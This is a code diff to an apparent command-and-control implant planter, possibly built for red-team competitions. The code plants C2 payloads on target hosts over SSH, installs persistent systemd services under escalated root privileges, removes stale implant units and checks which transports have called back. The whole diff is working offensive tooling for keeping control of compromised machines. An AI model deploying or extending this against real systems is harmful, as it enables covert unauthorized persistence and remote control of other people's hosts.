@@ -34,6 +34,10 @@ def load_manifest(comp_dir):
         raise C2Error(f"{path} is not valid JSON: {exc}") from exc
 
 
+def entry_name(entry, box_id):
+    return entry.get("name") or f"{box_id}-{entry.get('transport') or 'mtls'}"
+
+
 def manifest_entries(manifest, box_id, transport=None):
     """All comp-prep payloads for one box, optionally one transport.
 
@@ -84,13 +88,25 @@ class Planter:
         self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
         self._now = now or time.time
 
-    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
+    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None,
+              only_missing=False):
         """Plant every selected transport; a channel counts only when its callback appears."""
         if wait_sec is None:
             wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
         os_name = os_name or self.ctx.os_of(ip)
         entries = [entry for entry in manifest_entries(self.manifest, box_id, transport)
                    if entry.get("plant", True)]
+        if only_missing and entries:
+            records = (self.ctx.c2.callbacks_by_name()
+                       if hasattr(self.ctx.c2, "callbacks_by_name")
+                       else self.ctx.c2.callbacks())
+            missing = [entry for entry in entries
+                       if not self._fresh(records.get(entry_name(entry, box_id)))]
+            if not missing:
+                return {"ok": True, "callback_seen": True, "box": box_id,
+                        "detail": "every C2 transport already checked in",
+                        "coverage": {entry_name(e, box_id): True for e in entries}}
+            entries = missing
         if not entries:
             return {"ok": False, "callback_seen": False, "box": box_id,
                     "detail": f"no plantable manifest entry for {box_id} "
@@ -159,6 +175,23 @@ class Planter:
         tag = f"-{suffix}" if suffix else ""
         remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}{tag}"
         unit_path = f"/etc/systemd/system/{unit}"
+        if suffix:
+            # A re-plant used to add a second unit for the same transport and
+            # leave the old one running: two WG clients fought over wg0 and the
+            # survivor still looked "activating" (live: web01-150, 2026-10-22).
+            rc, out, _err = self.ctx.ssh.ssh(
+                ip, fh["user"], fh.get("password") or "",
+                "systemctl list-units --all --no-legend --type=service | "
+                f"awk '{{print $1}}' | grep -- '-{suffix}.service$' || true",
+                timeout=60, key_path=fh.get("key_path"))
+            old = [u for u in (out or "").split() if u.endswith(f"-{suffix}.service")]
+            if old:
+                root_cmd_cleanup = (f"systemctl disable --now {' '.join(old)}; "
+                                    f"rm -f {' '.join('/etc/systemd/system/' + u for u in old)}; "
+                                    "systemctl daemon-reload")
+                self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
+                                 root_cmd(root_cmd_cleanup, fh), timeout=120,
+                                 key_path=fh.get("key_path"))
         # Every privileged step rides the escalation the seed proved (or a root
         # foothold); a sudo refusal means the label was wrong, never a retry without it.
         label = fh.get("escalation") or fh.get("kind") or "?"
@@ -529,8 +562,7 @@ class Planter:
                    if hasattr(self.ctx.c2, "callbacks_by_name")
                    else self.ctx.c2.callbacks())
         for entry in entries:
-            name = entry.get("name") or f"{box_id}-{entry.get('transport')}"
-            if not self._fresh(records.get(name)):
+            if not self._fresh(records.get(entry_name(entry, box_id))):
                 return False
         return True
 
